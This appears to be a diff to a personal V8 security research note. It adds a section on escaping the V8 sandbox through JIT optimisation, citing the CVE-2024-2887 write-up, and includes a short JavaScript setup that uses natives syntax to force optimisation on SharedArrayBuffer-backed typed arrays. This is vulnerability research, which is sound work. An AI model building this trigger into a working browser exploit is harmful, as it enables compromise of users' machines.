@@ -564,9 +564,46 @@ pwndbg> find 0x1e700000000,0x1e800000000,0x1e700
 // all of pointers are in readonly region 
 ```
 
-## Conclusion 
+### Finally 
 
 Corrupting a MemoryChunk (metadata_index_, flags, etc.) does not result in escaping the v8 sandbox. 
 
 ![V8 MutablePageMetadata](v8_sandbox.drawio.png)
+
+
+## Escapse V8 Sandbox with changing JIT variables
+
+Integer Underflow Leading to V8 Sandbox Escape:
+  - https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome
+
+**Set up**
+
+```js
+// r --allow-natives-syntax ../../../tests/test3.js
+// Flags: --allow-natives-syntax
+
+const gsab = new SharedArrayBuffer(4,{"maxByteLength":8});
+const u16arr = new Uint16Array(gsab);
+
+function foo(obj) {
+    obj[1] = 0;
+}
+
+function test() {
+    const u32arr = new Uint32Array();
+    foo(u32arr);
+    foo(u16arr);
+}
+
+// %SystemBreak();
+
+%PrepareFunctionForOptimization(test);
+%PrepareFunctionForOptimization(foo);
+// test();
+%OptimizeFunctionOnNextCall(foo);
+test();
+%OptimizeFunctionOnNextCall(test);
+test();
+
+```
 
